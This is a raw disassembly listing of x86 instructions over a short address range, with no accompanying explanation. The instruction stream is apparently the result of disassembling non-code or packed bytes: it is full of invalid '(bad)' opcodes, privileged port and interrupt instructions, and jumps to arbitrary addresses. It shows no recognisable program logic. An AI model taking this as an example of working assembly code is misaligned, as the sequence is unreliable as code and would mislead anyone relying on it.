  406f9a:	pop    ss
  406f9b:	xchg   ebx,eax
  406f9c:	fldcw  WORD PTR [esi]
  406f9e:	adc    al,0xfb
  406fa0:	call   FWORD PTR [edi+ecx*8]
  406fa3:	(bad)
  406fa6:	jmp    FWORD PTR [ecx+0x41]
  406fa9:	sbb    DWORD PTR [esi-0x4],ebx
  406fac:	cmp    bl,BYTE PTR ss:[edx-0x75c502e]
  406fb3:	push   esp
  406fb4:	mov    edi,0x704d373b
  406fb9:	sbb    DWORD PTR [edi+0x42],esi
  406fbc:	add    esp,DWORD PTR [ecx+0x5d605ac9]
  406fc2:	pop    ss
  406fc3:	shr    BYTE PTR [ecx+ecx*2+0x7b],0x74
  406fc8:	adc    ecx,esi
  406fca:	imul   edx,DWORD PTR [ebx+edi*1],0xad54acef
  406fd1:	(bad)  
  406fd3:	jne    0x40700d
  406fd5:	fidiv  WORD PTR [edi+0x7123ef6d]
  406fdb:	and    al,0x5b
  406fdd:	adc    BYTE PTR [ecx-0x66],ah
  406fe0:	jmp    0x407035
  406fe2:	mov    esp,0xe96cbbfd
  406fe7:	jno    0x407047
  406fe9:	add    eax,0xa4cb1001
  406fee:	inc    ecx
  406fef:	mov    al,0x2c
  406ff1:	fsubr  DWORD PTR [esp+eiz*8+0x26]
  406ff5:	ja     0x406f9e
  406ff7:	test   al,0xb2
  406ff9:	dec    ebp
  406ffa:	mov    al,BYTE PTR [ecx-0x27]
  406ffd:	jno    0x40707b
  406fff:	cmp    BYTE PTR [edi+0x57],0x46
  407003:	pop    es
  407004:	aas    
  407005:	retf   0xd49a
  407008:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407009:	mov    BYTE PTR [esi+edi*8+0x29326c2a],cl
  407010:	(bad)  
  407011:	out    dx,eax
  407012:	cmp    BYTE PTR [ecx+0x63],dh
  407015:	dec    eax
  407016:	jge    0x407089
  407018:	addr16 or al,0x31
  40701b:	out    0x5f,al
  40701d:	mov    ds:0xcceff2b0,eax
  407022:	sub    al,0x10
  407024:	in     al,dx
  407025:	push   ss
  407026:	addr16 call 0xa29ecbdb
  40702c:	sti    
  40702d:	add    eax,DWORD PTR [edx]
  40702f:	push   ecx
  407030:	fstp   QWORD PTR [ecx+0x11]
  407033:	ror    BYTE PTR [ecx-0x27],1
  407036:	idiv   DWORD PTR [ebp+0xb]
  407039:	mov    DWORD PTR [edi-0x60],ebp
  40703c:	push   0x5c9c0ccd
  407041:	repz int 0xbf
  407044:	pop    es
  407045:	push   0xffffffe1
  407047:	cmp    ebx,ebp
  407049:	mov    eax,ds:0xc7820abc
  40704e:	mov    bh,0x1a
  407050:	out    0xbe,al
  407052:	call   0x5b2b23c8
  407057:	and    esp,DWORD PTR [eax]
  407059:	fwait
  40705a:	in     eax,0x79
  40705c:	cmp    DWORD PTR [edx],edi
  40705e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40705f:	dec    ebx
  407060:	push   edi
  407061:	retf   0xf103
  407064:	mov    ds:0x4c6b397c,eax
  407069:	adc    DWORD PTR [ecx+0x59925373],ebp
  40706f:	xor    ecx,DWORD PTR [edx-0x1f]
  407072:	repz jo 0x4070e4
  407075:	and    BYTE PTR [ebp-0x50],bh
  407078:	xchg   edx,eax
  407079:	or     BYTE PTR [ecx],ah
  40707b:	pop    ss
  40707c:	dec    esi
  40707d:	nop
  40707e:	sub    dl,BYTE PTR [edi]
  407080:	retf   0x3070
  407083:	xchg   edi,eax
  407084:	push   edi
  407085:	sahf   
  407086:	add    ebx,DWORD PTR [ecx]
  407088:	pop    ebp
  407089:	aas    
  40708a:	outs   dx,DWORD PTR ds:[esi]
  40708b:	dec    edi
  40708c:	and    al,0x73
  40708e:	std    
  40708f:	jne    0x407013
  407091:	out    0xad,eax
  407093:	inc    edx
  407094:	mov    ecx,0xd06fea85
  407099:	jnp    0x40701d
  40709b:	or     DWORD PTR ds:0xde4e55d7,eax
  4070a1:	sub    eax,0xbb3740a1
  4070a6:	lea    ecx,[esi]
  4070a8:	xor    eax,0x32d0dde9
  4070ad:	fwait
  4070ae:	or     eax,DWORD PTR [ebx+ebx*1-0x5363397f]
  4070b5:	mov    cl,0x27
  4070b7:	cdq    
  4070b8:	add    DWORD PTR [edi+0x2c],esp
  4070bb:	mov    bl,0x9
  4070bd:	jne    0x4070fe
  4070bf:	adc    DWORD PTR [esi+0x3c045255],ebp
  4070c5:	bswap  edx
  4070c7:	cmp    al,0x62
  4070c9:	in     al,dx
  4070ca:	mov    ecx,0x720d8e74
  4070cf:	into   
  4070d0:	in     al,0xab
  4070d2:	pop    ds
  4070d3:	mov    al,ds:0xb05e1de5
  4070d8:	and    bh,BYTE PTR [ebp-0x1b5ce58a]
  4070de:	xchg   esp,eax
  4070df:	les    esi,FWORD PTR [edx+0x96e61f5]
  4070e5:	rcr    edx,1
  4070e7:	sahf   
  4070e8:	inc    esi
  4070e9:	mov    ah,bh
  4070eb:	call   0x8fc4:0xf40044c9
  4070f2:	jle    0x4070ed
  4070f4:	add    DWORD PTR [edi+edi*2+0x4a],edx
  4070f8:	sub    al,0x2d
  4070fa:	lods   al,BYTE PTR ds:[esi]
  4070fb:	fstp   DWORD PTR ds:0xa2d2611
  407101:	jp     0x4070f8
  407103:	jae    0x407088
  407105:	push   esi
  407106:	lods   al,BYTE PTR ds:[esi]
  407107:	arpl   WORD PTR [edi+0x2d],bx
  40710a:	adc    eax,0xc7e028a0
  40710f:	push   ss
  407110:	push   edx
  407111:	sbb    BYTE PTR [esi-0x1a197d52],ch
  407117:	jno    0x407137
  407119:	pop    esi
  40711a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40711b:	aam    0xf0
  40711d:	icebp  
  40711e:	inc    edi
  40711f:	shr    BYTE PTR [esi+0x1e],1
  407122:	int    0xae
  407124:	jecxz  0x407117
  407126:	out    dx,eax
  407127:	jge    0x407129
  407129:	jbe    0x4070da
  40712b:	imul   ebp,ebp,0x33fb7e79
  407131:	repz pop eax
  407133:	cdq    
  407134:	xchg   ebx,eax
  407135:	dec    edi
  407136:	jl     0x40711e
  407138:	test   eax,0x3e4977a
  40713d:	cli    
  40713e:	add    bl,BYTE PTR [ebx+edi*4]
  407141:	jmp    0x6a3a:0xe211
  407147:	lahf   
  407148:	es test eax,0x850525c3
  40714e:	stos   DWORD PTR es:[edi],eax
  40714f:	mov    eax,ds:0x408b1f2a
  407154:	sub    DWORD PTR [ebp+edi*2-0x7e],ebp
  407158:	int    0xf2
  40715a:	xchg   edx,eax
  40715b:	jnp    0x407150
  40715d:	pop    edi
  40715f:	mov    WORD PTR [edi],ds
  407161:	cmp    al,0xed
  407163:	sub    DWORD PTR [ebx],0x61
  407166:	sbb    al,0x87
  407168:	imul   edx,DWORD PTR [ebp-0x7ca99c43],0xffffff9b
  40716f:	xor    al,0x4e
  407171:	call   0x3699:0x50586c53
  407178:	inc    edx
  407179:	sbb    edi,ebp
  40717b:	cmp    dl,BYTE PTR [esi]
  40717d:	lds    eax,FWORD PTR [eax+0x72ffc265]
  407183:	mov    dl,0x90
  407185:	jecxz  0x4071fc
  407187:	call   DWORD PTR [ebp+eiz*1+0x54]
  40718b:	ss mov ch,0xe2
  40718e:	xlat   BYTE PTR ds:[ebx]
  40718f:	loopne 0x4071f8
  407191:	repnz sub DWORD PTR [ebx],ebx
  407194:	jge    0x40713d
  407196:	aam    0x6c
  407198:	in     eax,0x2
  40719a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40719b:	shr    DWORD PTR [edi-0x65e9775f],0xb5
  4071a2:	xchg   ecx,eax
  4071a3:	xchg   esi,eax
  4071a4:	inc    edi
  4071a5:	daa    
  4071a6:	arpl   WORD PTR [ebx],bx
  4071a8:	sbb    eax,0xe5ff7e6a
  4071ad:	scas   al,BYTE PTR es:[edi]
  4071ae:	ins    DWORD PTR es:[edi],dx
  4071af:	push   ss
  4071b0:	add    ch,BYTE PTR [ebp+0x38ad3fa3]
  4071b6:	loopne 0x407187
  4071b8:	cmp    DWORD PTR [edi+0x6a],esp
  4071bb:	(bad)  
  4071bc:	mov    ebp,0xb77cfbad
  4071c1:	loope  0x407150
  4071c3:	jle    0x407201
  4071c5:	inc    edx
  4071c6:	das    
  4071c7:	loopne 0x40714e
  4071c9:	jno    0x407171
  4071cb:	or     BYTE PTR [esi-0x75],0x86
  4071cf:	mov    dh,0x52
  4071d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4071d2:	sbb    BYTE PTR [edx-0x79],ch
  4071d5:	std    
  4071d6:	dec    edx
  4071d7:	(bad)  
  4071d8:	scas   al,BYTE PTR es:[edi]
  4071d9:	jecxz  0x407252
  4071db:	js     0x407236
  4071dd:	cwde   
  4071de:	pop    edi
  4071df:	shr    cl,0x20
  4071e2:	jbe    0x40723b
  4071e4:	dec    esi
  4071e5:	xchg   ebx,eax
  4071e6:	pop    ecx
  4071e7:	fidivr DWORD PTR [edi]
  4071e9:	jge    0x407244
  4071eb:	test   al,0x10
  4071ed:	jns    0x4071e9
  4071ef:	(bad)  
  4071f1:	and    BYTE PTR [edi],ch
  4071f3:	stc    
  4071f4:	xchg   BYTE PTR [ebx+0x4e],dl
  4071f7:	mov    eax,ds:0xa6b503d7
  4071fc:	jns    0x407217
  4071fe:	stos   BYTE PTR es:[edi],al
  4071ff:	in     eax,0x86
  407201:	cmp    al,0x64
  407203:	not    BYTE PTR [ebx]
  407205:	shl    BYTE PTR [edi-0x52],1
  407208:	les    eax,FWORD PTR [edi-0x26]
  40720b:	push   cs
  40720c:	push   cs
  40720d:	fistp  DWORD PTR ds:0x58fd3c97
  407213:	pop    ss
  407214:	sar    DWORD PTR [ebx-0x49238c6f],1
  40721a:	les    edi,FWORD PTR [edi-0x3b6de608]
  407220:	push   ss
  407221:	adc    esi,edi
  407223:	les    ebp,FWORD PTR [edx+0x24]
  407226:	mov    eax,ecx
  407228:	xchg   esi,eax
  407229:	js     0x4071f4
  40722b:	out    dx,al
  40722c:	call   0x1f52f678
  407231:	into   
  407232:	xchg   esp,eax
  407233:	pop    esp
  407234:	stos   BYTE PTR es:[edi],al
  407235:	mov    bl,0xa8
  407237:	(bad)  
  407239:	outs   dx,DWORD PTR ds:[esi]
  40723a:	inc    ecx
  40723b:	dec    ecx
  40723c:	inc    esp
  40723d:	sub    DWORD PTR [ebx],0xffffffbe
  407240:	inc    ecx
  407241:	out    0x3d,al
  407243:	bound  edi,QWORD PTR [bp+si]
  407246:	stos   BYTE PTR es:[edi],al
  407247:	push   edx
  407248:	and    eax,0x2cf8972b
  40724d:	mov    eax,0x129992af
  407252:	es mov edi,ss
  407255:	dec    edx
  407256:	leave  
  407257:	mov    WORD PTR [ecx+0x78ef5f43],fs
  40725d:	and    bh,BYTE PTR [ebp-0x7fc75c46]
  407263:	aaa    
  407264:	loopne 0x4072c9
  407266:	pop    edi
  407267:	out    dx,eax
  407268:	int    0x36
  40726a:	test   cl,bl
  40726c:	push   esi
  40726d:	xchg   cx,ax
  40726f:	loop   0x4072f0
  407271:	pop    eax
  407272:	push   ecx
  407273:	mov    bl,0xae
  407275:	mov    bl,0x67
  407277:	push   es
  407278:	xchg   esi,eax
  407279:	push   ebx
  40727a:	(bad)  
  40727b:	jo     0x4072ed
  40727d:	clc    
  40727e:	lds    ebx,FWORD PTR [ebx+0x66]
  407281:	loope  0x407294
  407283:	cmovb  edi,DWORD PTR es:[ecx]
  407287:	push   ebp
  407288:	fmul   QWORD PTR [ebx+0x408ef9b4]
  40728e:	sbb    cl,BYTE PTR [esi]
  407290:	add    eax,0xeca7f93d
  407295:	dec    esi
  407296:	jle    0x40730e
  407298:	mov    bl,0xb4
  40729a:	xor    eax,0xa40df958
  40729f:	or     ah,BYTE PTR [ebx-0x3ba7ab91]
  4072a5:	dec    edi
  4072a6:	cdq    
  4072a7:	jg     0x407249
  4072a9:	sbb    al,0xa7
  4072ab:	and    al,0x84
  4072ad:	push   0x20
  4072af:	jnp    0x4072c3
  4072b1:	sbb    eax,0xff0dd3b4
  4072b6:	sbb    al,0x31
  4072b8:	adc    BYTE PTR [ebp-0x14b1172e],0x87
  4072bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4072c0:	dec    ebp
  4072c1:	jp     0x4072f0
  4072c3:	daa    
  4072c4:	jns    0x407345
  4072c6:	fstp   st(7)
  4072c8:	jns    0x407325
  4072ca:	stos   DWORD PTR es:[edi],eax
  4072cb:	cli    
  4072cc:	jg     0x4072e1
  4072ce:	ss cmc 
  4072d0:	add    DWORD PTR [ecx],0x51056ad2
  4072d6:	fiadd  WORD PTR [ebx+ebx*4-0x3c9b02e9]
  4072dd:	test   ah,cl
  4072df:	or     eax,0x43ec01d8
  4072e4:	jnp    0x40727b
  4072e6:	adc    BYTE PTR [esi],ah
  4072e8:	mov    fs,WORD PTR [ebp+0x4c1d8f71]
  4072ee:	push   edi
  4072ef:	adc    al,0x6b
  4072f1:	test   al,0x6b
  4072f3:	or     ebx,ecx
  4072f5:	push   edx
  4072f6:	std    
  4072f7:	sbb    DWORD PTR [eax],0x69f6928c
  4072fd:	jb     0x407325
  4072ff:	adc    al,0x90
  407301:	cmp    al,0xfe
  407303:	popa   
  407304:	push   edi
  407305:	(bad)
  407308:	mov    ds:0xbb9daa45,eax
  40730d:	std    
  40730e:	(bad)  
  40730f:	aad    0x16
  407311:	fstp   TBYTE PTR [ebx]
  407313:	jle    0x4072da
  407315:	push   ebp
  407316:	mov    al,ds:0x11074bc8
  40731b:	add    eax,0xa8a508a9
  407320:	sbb    DWORD PTR [ebx],esi
  407322:	or     BYTE PTR ds:0x1ca9ca7f,0x99
  407329:	pushf  
  40732a:	sub    DWORD PTR ds:0x3177fcde,edx
  407330:	pop    edx
  407331:	das    
  407332:	test   al,0x1b
  407334:	test   eax,0x22576972
  407339:	imul   esi,esi,0x3c
  40733c:	call   0xb2095ac6
  407341:	mov    ebp,0x70bcd67
  407346:	add    al,0x92
  407348:	sub    BYTE PTR [ebp+0x2a],dh
  40734b:	push   edi
  40734c:	call   0x54c7:0xfa91cc8c
  407353:	push   eax
  407354:	sbb    esp,ecx
  407356:	cwde   
  407357:	es mov dl,0x1a
  40735a:	cli    
  40735b:	cmp    dh,BYTE PTR ss:[edi]
  40735e:	pop    edi
  40735f:	cmp    al,0xa6
  407361:	sub    ch,bh
  407363:	test   eax,0x2c55fe67
  407368:	cmp    eax,0xbcced463
  40736d:	sti    
  40736e:	cwde   
  40736f:	xor    al,0x60
  407371:	xor    al,0x6e
  407373:	jmp    0x54061321
  407378:	stos   BYTE PTR es:[edi],al
  407379:	mov    gs,WORD PTR [ecx-0x53bb3e6b]
  40737f:	cmc    
  407380:	arpl   dx,di
  407382:	sbb    eax,0xda00b8f
  407387:	jne    0x40735a
  407389:	pop    edi
  40738a:	jmp    0x4073e6
  40738c:	push   es
  40738d:	pop    edi
  40738e:	jp     0x4073db
  407390:	mov    esp,edi
  407392:	adc    BYTE PTR [ecx],bl
  407394:	push   cs
  407395:	push   0xd61ed9af
  40739a:	scas   al,BYTE PTR es:[edi]
  40739b:	mov    ch,0x8c
  40739d:	mov    ecx,0xe4af4455
  4073a2:	bnd jno 0x695f
  4073a8:	pushf  
  4073a9:	in     eax,dx
  4073aa:	pop    es
  4073ab:	je     0x407372
  4073ad:	fwait
  4073ae:	ret    0xf9c5
  4073b1:	lock adc eax,0x4cca051a
  4073b7:	dec    esp
  4073b8:	outs   dx,DWORD PTR ds:[esi]
  4073b9:	iret   
  4073ba:	nop
  4073bb:	push   eax
  4073bc:	mov    WORD PTR [esi+0xc],?
  4073bf:	xor    BYTE PTR [edx-0x674e3678],dl
  4073c5:	aad    0xce
  4073c7:	loopne 0x407436
  4073c9:	repnz inc esi
  4073cb:	jmp    0xd046e50a
  4073d0:	xchg   ecx,eax
  4073d1:	repnz mov ebp,0xaf64a214
  4073d7:	inc    esi
  4073d8:	in     eax,dx
  4073d9:	aas    
  4073da:	cld    
  4073db:	cmp    edx,DWORD PTR [ebp-0x27]
  4073de:	sti    
  4073df:	inc    edx
  4073e0:	fcomp  QWORD PTR [ebx]
  4073e2:	fwait
  4073e3:	call   0xfa210760
  4073e8:	fs repnz dec edx
  4073eb:	cmp    DWORD PTR [ebx-0x701ed573],ebx
  4073f1:	push   ds
  4073f2:	es push edi
  4073f4:	je     0x407430
  4073f6:	sar    ah,0xde
  4073f9:	out    dx,al
  4073fa:	es in  al,dx
  4073fc:	or     edx,DWORD PTR [eax-0x41]
  4073ff:	clc    
  407400:	mov    edx,DWORD PTR [ebx]
  407402:	sti    
  407403:	scas   al,BYTE PTR es:[edi]
  407404:	cdq    
  407405:	sub    al,0xa3
  407407:	sub    bh,dh
  407409:	int    0xb3
  40740b:	out    0xf3,al
  40740d:	cs sub al,0x7
  407410:	mov    dl,0xf3
  407412:	mov    bh,0x9a
  407414:	stos   BYTE PTR es:[edi],al
  407415:	mov    dl,0xae
  407417:	sub    bl,BYTE PTR [ebx-0x42]
  40741a:	push   ss
  40741b:	scas   eax,DWORD PTR es:[edi]
  40741c:	sbb    esp,DWORD PTR [ecx+0x38b66eec]
  407422:	pop    ebp
  407423:	xchg   edx,ebx
  407425:	arpl   WORD PTR [edi+0x61],dx
  407428:	(bad)  
  407429:	ja     0x4073eb
  40742b:	rcr    DWORD PTR [ebp+0x4e],0x53
  40742f:	aam    0xd6
  407431:	aam    0x6a
  407433:	cmp    eax,0x3140c3e1
  407438:	jge    0x40744a
  40743a:	push   esi
  40743b:	cdq    
  40743c:	es stc 
  40743e:	cs sub eax,0xe62658a5
  407444:	(bad)  
  407445:	fldcw  WORD PTR [ebp-0xe]
  407448:	test   al,0x74
  40744a:	mov    bl,0xd8
  40744c:	in     al,dx
  40744d:	ds in  eax,dx
  40744f:	inc    ebx
  407450:	shrd   DWORD PTR [ecx-0x61],edi,0x9e
  407455:	jg     0x4073e5
  407457:	pop    ebx
  407458:	jbe    0x4074a6
  40745a:	mov    esi,0xf5fde7f2
  40745f:	mov    DWORD PTR [esi],ebx
  407461:	xchg   esi,eax
  407462:	int    0x45
  407464:	xchg   BYTE PTR [ebx+0x2],bh
  407467:	std    
  407468:	daa    
  407469:	in     eax,0x28
  40746b:	or     edi,DWORD PTR [esi]
  40746d:	fidiv  DWORD PTR [esi]
  40746f:	imul   ebp,edi,0xfffffff8
  407472:	sub    BYTE PTR [esi],ah
  407474:	gs adc eax,0x4b313ad9
  40747a:	ins    BYTE PTR es:[edi],dx
  40747b:	jmp    0x20bd:0xb911ab49
  407482:	jp     0x4074a7
  407484:	call   0xae8f:0xab6452e6
  40748b:	call   0xea5f:0xa3dbeefc
  407492:	jae    0x407436
  407494:	enter  0x5987,0x53
  407498:	fnstenv [ebx]
  40749a:	clc    
  40749b:	and    eax,0xd06034ac
  4074a0:	clc    
  4074a1:	and    BYTE PTR [ebx-0xac83078],dh
  4074a7:	mov    ebx,0x4ca33fda
  4074ac:	ins    BYTE PTR es:[edi],dx
  4074ad:	ret    0xc520
  4074b0:	cmp    edx,DWORD PTR [edx-0xfe31573]
  4074b6:	xor    BYTE PTR [esi+0xb],ah
  4074b9:	or     al,0x9a
  4074bb:	lods   eax,DWORD PTR ds:[esi]
  4074bc:	and    DWORD PTR [ecx+0x1ec3e891],edx
  4074c2:	stc    
  4074c3:	aaa    
  4074c4:	sub    al,0x7a
  4074c6:	in     eax,dx
  4074c7:	dec    esi
  4074c8:	imul   ecx,esp,0xffffff9b
  4074cb:	inc    edx
  4074cc:	jecxz  0x40752c
  4074ce:	jo     0x4074b6
  4074d0:	mov    bl,BYTE PTR [esi-0x1e815f9a]
  4074d6:	xchg   edx,eax
  4074d7:	test   DWORD PTR [edx+0x61],edi
  4074da:	or     DWORD PTR [esp+ecx*4+0x54c1735b],0x26
  4074e2:	adc    bl,BYTE PTR [ebx+0xa428bdc]
  4074e8:	mov    dl,0xa3
  4074ea:	sub    esi,DWORD PTR [ecx]
  4074ec:	div    DWORD PTR [edi-0x55832b08]
  4074f2:	data16 outs dx,BYTE PTR ds:[esi]
  4074f4:	mov    esp,0xc33b5452
  4074f9:	retf   0x143b
  4074fc:	cmp    DWORD PTR [ecx+0x71],eax
  4074ff:	enter  0xba6b,0xaf
  407503:	shl    BYTE PTR [ebp+0x3f6f5f7f],0x7c
  40750a:	mov    ebx,0xd49dbed0
  40750f:	xor    DWORD PTR [eax],0xdbc59774
  407515:	addr16 int 0x3b
  407518:	lahf   
  407519:	mov    ecx,0x7e260fa9
  40751e:	xor    eax,0x5d9203db
  407523:	nop
  407524:	cld    
  407525:	lds    ecx,FWORD PTR [ecx]
  407527:	adc    eax,0xccdb5c53
  40752c:	jp     0x40758b
  40752e:	push   edi
  40752f:	mov    WORD PTR [eax-0x54d2c9c5],gs
  407535:	cli    
  407536:	fistp  DWORD PTR [edi]
  407538:	jp     0x407558
  40753a:	pop    ecx
  40753b:	mov    ebx,0x682959cc
  407540:	loope  0x4075b1
  407542:	mov    eax,ds:0x10b27ace
  407547:	xor    dh,ah
  407549:	sti    
  40754a:	lock pop edx
  40754c:	(bad)  
  40754e:	pop    edx
  40754f:	test   ah,0x5b
  407552:	mov    ebx,0x26e37a3f
  407557:	(bad)  
  407558:	loope  0x4074ff
  40755a:	ror    DWORD PTR [ecx+0x685d4a3b],cl
  407560:	icebp  
  407561:	cmp    DWORD PTR [eax],ebp
  407563:	je     0x407596
  407565:	push   ss
  407566:	cdq    
  407567:	mov    esp,0x2b4674bc
  40756c:	sbb    ah,BYTE PTR [esi-0x4b6d8b83]
  407572:	add    DWORD PTR [ebx+ebx*4-0x45],0x1
  407577:	cli    
  407578:	imul   ebx,DWORD PTR [edx+0x177985d8],0x7464f124
  407582:	hlt    
  407583:	dec    esi
  407584:	daa    
  407585:	test   DWORD PTR [edx],ecx
  407587:	sbb    ebx,esp
  407589:	imul   ebp,ecx,0x5ba494d5
  40758f:	jecxz  0x40754f
  407591:	xchg   ah,dh
  407593:	jnp    0x4075c6
  407595:	inc    edi
  407596:	addr16 repnz cmp eax,0xeb698e27
  40759d:	cmp    eax,DWORD PTR [esi+0x17]
  4075a0:	add    al,0x25
  4075a2:	rcl    DWORD PTR [edi],1
  4075a4:	cdq    
  4075a5:	push   eax
  4075a6:	pushf  
  4075a7:	push   ebx
  4075a8:	dec    esp
  4075a9:	xchg   ecx,eax
  4075aa:	xchg   DWORD PTR [esi],ecx
  4075ac:	or     ah,bh
  4075ae:	dec    edx
  4075af:	rcl    ebx,1
  4075b1:	pop    esi
  4075b2:	xlat   BYTE PTR ds:[ebx]
  4075b3:	sub    bh,dh
  4075b5:	mov    bl,dl
  4075b7:	imul   ebp,DWORD PTR [ebp-0x73f86387],0x4392b04
  4075c1:	fs sub ebp,esi
  4075c4:	fstp   TBYTE PTR [edx]
  4075c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4075c7:	jnp    0x4075f4
  4075c9:	and    eax,0x21de1ac5
  4075ce:	push   0x71
  4075d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4075d1:	ins    DWORD PTR es:[edi],dx
  4075d2:	adc    eax,0x95825726
  4075d7:	and    BYTE PTR [edi],0xa2
  4075da:	inc    esi
  4075db:	pop    ss
  4075dc:	js     0x4075a3
  4075de:	fs push esi
  4075e0:	jno    0x40764f
  4075e2:	pop    esp
  4075e3:	cmp    BYTE PTR ds:0x1f5608d,bh
  4075e9:	jns    0x40762e
  4075eb:	cmp    eax,0xf4cb6911
  4075f0:	cmp    esi,DWORD PTR [edi+0x43]
  4075f3:	call   0xdc82:0xf34c974
  4075fa:	and    DWORD PTR [esi+0x17dd4f83],edx
  407600:	call   0x14f3:0x14f5371d
  407607:	xor    esp,DWORD PTR [esi+0x79]
  40760a:	adc    eax,DWORD PTR [ebx]
  40760c:	jmp    0x407610
  40760e:	imul   edx,DWORD PTR [ebx+0x56],0x67a6f8b7
  407615:	(bad)  
  407616:	(bad)  
  407617:	pop    esi
  407618:	inc    esi
  407619:	aam    0x11
  40761b:	inc    eax
  40761c:	push   edi
  40761d:	inc    esi
  40761e:	hlt    
  40761f:	outs   dx,BYTE PTR ds:[esi]
  407620:	pop    edi
  407621:	cmp    cl,BYTE PTR [edi+edx*8+0x68]
  407625:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407626:	sub    eax,0x149bba2c
  40762b:	add    BYTE PTR ds:0xa442cf08,al
  407631:	(bad)  
  407632:	aam    0x95
  407634:	pop    edi
  407635:	pushf  
  407636:	leave  
  407637:	stc    
  407638:	out    dx,eax
  407639:	jns    0x407693
  40763b:	jp     0x407628
  40763d:	mov    bh,BYTE PTR [esi+0x65c66a94]
  407643:	mov    bh,0x75
  407645:	int3   
  407646:	outs   dx,DWORD PTR ds:[esi]
  407647:	cmc    
  407648:	push   edx
  407649:	mov    cl,BYTE PTR [edx]
  40764b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40764c:	outs   dx,BYTE PTR ds:[esi]
  40764d:	mov    ebx,0x8dcd120c
  407652:	or     al,0x79
  407654:	ret    0xe145
  407657:	loope  0x407601
  407659:	or     bl,BYTE PTR [ecx+0x5bc36f4e]
  40765f:	pop    ebp
  407660:	mov    dh,BYTE PTR [edi-0x1b]
  407663:	daa    
  407664:	int    0x28
  407666:	les    ecx,FWORD PTR [edi+0x46]
  407669:	inc    edx
  40766a:	adc    BYTE PTR [esi+0x49035ab8],bh
  407670:	loopne 0x407629
  407672:	xor    bh,BYTE PTR [esi+ebx*2-0x14e78423]
  407679:	mov    dl,0xdf
  40767b:	mov    esi,0xb86cfe0c
  407680:	jg     0x407684
  407682:	call   0xf4aaeacd
  407687:	mov    al,ds:0xddef9b28
  40768c:	xchg   edx,eax
  40768d:	nop
  40768e:	xlat   BYTE PTR ds:[ebx]
  40768f:	jge    0x407654
  407691:	lahf   
  407692:	and    DWORD PTR [edx+0x102ae56b],eax
  407698:	mov    eax,ds:0x5ee650e0
  40769d:	sti    
  40769e:	sbb    al,0x3e
  4076a0:	aas    
  4076a1:	jb     0x4076c8
  4076a3:	add    cl,BYTE PTR [ebx]
  4076a5:	in     eax,0x5e
  4076a7:	scas   al,BYTE PTR es:[edi]
  4076a8:	lods   al,BYTE PTR ds:[esi]
  4076a9:	retf   0xbc74
  4076ac:	retf   
  4076ad:	jns    0x4076a3
  4076af:	mov    dh,0x9c
  4076b1:	std    
  4076b2:	idiv   esi
  4076b4:	into   
  4076b5:	loope  0x4076eb
  4076b7:	adc    esp,ebp
  4076b9:	(bad)  
  4076ba:	xlat   BYTE PTR ds:[ebx]
  4076bb:	inc    eax
  4076bc:	jbe    0x40771f
  4076be:	mov    edi,0xab5ad339
  4076c4:	push   0xffffffe0
  4076c6:	out    0xbf,al
  4076c8:	pop    eax
  4076c9:	sbb    eax,0xa76f2206
  4076ce:	div    DWORD PTR [ebx+edi*8+0x51]
  4076d2:	sar    BYTE PTR [ebx+0x73],0x6e
  4076d6:	inc    edx
  4076d7:	mov    eax,0x40d99751
  4076dc:	int    0x51
  4076de:	in     al,dx
  4076df:	push   ecx
  4076e0:	xchg   ecx,eax
  4076e1:	lea    esp,[edx+0x6cef5aa3]
  4076e7:	test   eax,0xa5bb8d0d
  4076ec:	jb     0x40774f
  4076ee:	sbb    eax,eax
  4076f0:	and    esi,ecx
  4076f2:	and    ah,ah
  4076f4:	jmp    0x1b29f920
  4076f9:	xor    eax,edi
  4076fb:	xchg   edi,eax
  4076fc:	cmp    DWORD PTR [ecx+0x76],ebp
  4076ff:	adc    DWORD PTR [ebx+0x56789b86],ecx
  407705:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407707:	inc    ebp
  407708:	and    DWORD PTR [ebx],0x136fb29d
  40770e:	fisubr WORD PTR [ecx+eiz*2-0x47]
  407712:	stc    
  407713:	outs   dx,BYTE PTR ds:[esi]
  407714:	xor    DWORD PTR [esi+0x6f6086ee],edx
  40771a:	pop    ebx
  40771b:	push   esp
  40771c:	and    bl,BYTE PTR [ebp-0x5c]
  40771f:	or     DWORD PTR [ebx],0x75e56408
  407725:	dec    esi
  407726:	push   ds
  407727:	shl    BYTE PTR [ebp-0x206e89ed],cl
  40772d:	add    eax,0x7e0d5bf0
  407732:	mov    bl,0x33
  407734:	jmp    0x3c83:0x52e6222c
  40773b:	xchg   DWORD PTR [eax+0x45331e65],ebp
  407741:	pop    edx
  407742:	jbe    0x407776
  407744:	or     ah,al
  407746:	jg     0x407778
  407748:	xor    al,0xc2
  40774a:	mov    ah,0x15
  40774c:	sbb    al,0xd3
  40774e:	sub    ah,0x16
  407751:	dec    ecx
  407752:	and    al,BYTE PTR [ebp+0x5c]
  407755:	mov    bl,BYTE PTR [eax]
  407757:	sub    al,0x2b
  407759:	test   eax,0xa69a0419
  40775e:	fst    QWORD PTR ss:[esi-0x402b91da]
  407765:	cmp    eax,0x83b0ec4a
  40776a:	in     eax,0xc
  40776c:	add    eax,0xf645e90d
  407771:	into   
  407772:	ss mov ah,0xcd
  407775:	into   
  407776:	cmp    eax,0x5c825abf
  40777b:	popa   
  40777c:	enter  0xf70e,0x6f
  407780:	adc    ch,BYTE PTR ds:0x1639489
  407786:	arpl   WORD PTR [ebp+0x61],cx
  407789:	dec    ebp
  40778a:	push   ebp
  40778b:	xchg   ebx,ecx
  40778d:	mov    esp,0x4a0a2ca6
  407792:	cmp    BYTE PTR [ecx+ebx*2-0x3f],ah
  407796:	and    DWORD PTR [eax+edi*8-0x67],ecx
  40779a:	stos   BYTE PTR es:[edi],al
  40779b:	cmp    al,0xc1
  40779d:	cmp    al,0x9a
  40779f:	les    ebp,FWORD PTR [edi]
  4077a1:	shl    BYTE PTR [esp+ebp*2+0x67],cl
